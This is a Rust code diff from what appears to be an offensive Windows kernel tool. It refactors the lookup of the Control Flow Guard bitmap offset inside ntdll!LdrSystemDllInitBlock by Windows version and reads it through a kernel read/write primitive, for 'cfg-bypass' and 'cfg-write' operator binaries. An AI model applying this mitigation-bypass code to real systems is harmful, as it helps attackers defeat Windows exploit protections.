@@ -37,6 +37,28 @@ pub struct CfgBitMap {
     pub size: usize,
 }
 
+/// CFG-bitmap offset within `LdrSystemDllInitBlock`, selected by the block's
+/// Size field (first ULONG). Single source of truth for BOTH the in-process
+/// `locate_cfg_bitmap` path and the operator CLI binaries (`nyx-kernel
+/// cfg-bypass`, `cfg-write`) — kernel-tools-4: the two binaries previously
+/// maintained divergent offset mappings for the same block sizes (main.rs
+/// picked 0x60/0x68 where cfg-write picked 0xC0/0xC8), so one of them always
+/// missed the bitmap or wrote a bit at a wrong address.
+///
+/// Mapping (per Geoff Chappell's LdrSystemDllInitBlock layout + Black Hat
+/// CFG research): Win8.1 / early Win10 blocks keep the bitmap at 0x40;
+/// Win10 1709+ moved it to 0x60; Win10 2004+ grew the block further and the
+/// bitmap sits at 0x68.
+pub fn cfg_bitmap_offset(block_size: usize) -> usize {
+    if block_size <= 0x70 {
+        0x40 // Win8.1 / early Win10
+    } else if block_size <= 0xF8 {
+        0x60 // Win10 1709–1909
+    } else {
+        0x68 // Win10 2004+
+    }
+}
+
 /// Locate the CFG bitmap by reading `ntdll!LdrSystemDllInitBlock` from the
 /// operator's own process. The bitmap address is the same in every process.
 ///
@@ -51,17 +73,9 @@ pub fn locate_cfg_bitmap(ntdll_base: usize, krw: &dyn KernelRw) -> Option<CfgBit
     krw.kread(ntdll_base + init_block_rva, &mut size_buf).ok()?;
     let block_size = u32::from_le_bytes(size_buf) as usize;
 
-    // 3. Determine CfgBitMap offset based on structure size.
-    //    Win8.1 (0x70): CfgBitMap at 0x40
-    //    Win10 1709+ (0xF0+): CfgBitMap at 0x60
-    //    Win10 2004+ (≥0x100): CfgBitMap at 0x68 or 0x70
-    let cfg_bitmap_off: usize = if block_size <= 0x70 {
-        0x40 // Win8.1 / early Win10
-    } else if block_size <= 0xF8 {
-        0x60 // Win10 1709–1909
-    } else {
-        0x68 // Win10 2004+
-    };
+    // 3. Determine CfgBitMap offset based on structure size (shared helper —
+    //    single source of truth; see cfg_bitmap_offset).
+    let cfg_bitmap_off = cfg_bitmap_offset(block_size);
 
     // 4. Read CfgBitMap (ULONG64, 8 bytes) and CfgBitMapSize (ULONG64, 8 bytes).
     let mut bitmap_buf = [0u8; 16];
